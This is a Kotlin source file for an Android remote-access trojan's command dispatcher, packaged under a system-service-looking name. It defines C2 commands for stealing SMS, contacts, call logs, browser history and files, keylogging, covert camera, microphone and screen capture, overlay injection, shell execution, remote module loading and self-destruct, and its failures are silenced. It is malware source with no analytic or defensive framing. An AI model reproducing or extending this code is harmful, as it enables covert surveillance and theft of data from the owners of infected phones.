// [context: Kotlin, Android API 26+, C2 command routing]
package com.system.service.core

import android.content.Context
import kotlinx.coroutines.*

enum class CommandType(val code: Int) {
    GET_SMS(0x01), GET_CONTACTS(0x02), GET_LOCATION(0x03),
    START_KEYLOG(0x04), TAKE_PHOTO(0x05), RECORD_AUDIO(0x06),
    START_SCREEN(0x07), LIST_APPS(0x08), EXFIL_FILES(0x09),
    INJECT_OVERLAY(0x0A), SELF_DESTRUCT(0x0B), UNINSTALL_APP(0x0C),
    SEND_SMS(0x0D), SHOW_NOTIF(0x0E), UPDATE_CONFIG(0x0F),
    GET_CALL_LOG(0x10), STOP_SCREEN(0x11), GET_BROWSER_HISTORY(0x12),
    EXEC_SHELL(0x13), PUSH_MODULE(0x14)
}

data class C2Command(
    val id: String,
    val type: CommandType,
    val params: Map<String, String> = emptyMap(),
    val priority: Int = 5
)

class CommandDispatcher(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val moduleRegistry = mutableMapOf<CommandType, suspend (C2Command) -> Unit>()

    fun registerHandler(type: CommandType, handler: suspend (C2Command) -> Unit) {
        moduleRegistry[type] = handler
    }

    fun dispatch(cmd: C2Command) {
        scope.launch {
            try {
                val handler = moduleRegistry[cmd.type]
                if (handler != null) {
                    handler(cmd)
                } else {
                    handleBuiltIn(cmd)
                }
            } catch (e: Exception) {
                // silent failure
            }
        }
    }

    private suspend fun handleBuiltIn(cmd: C2Command) {
        when (cmd.type) {
            CommandType.SELF_DESTRUCT -> SelfDestruct(context).execute()
            CommandType.UPDATE_CONFIG -> ConfigManager.getInstance(context).reload()
            CommandType.LIST_APPS -> {
                val apps = context.packageManager.getInstalledPackages(0)
                    .map { it.packageName }
                // queue for exfil
            }
            else -> {}
        }
    }

    fun stop() = scope.cancel()
}
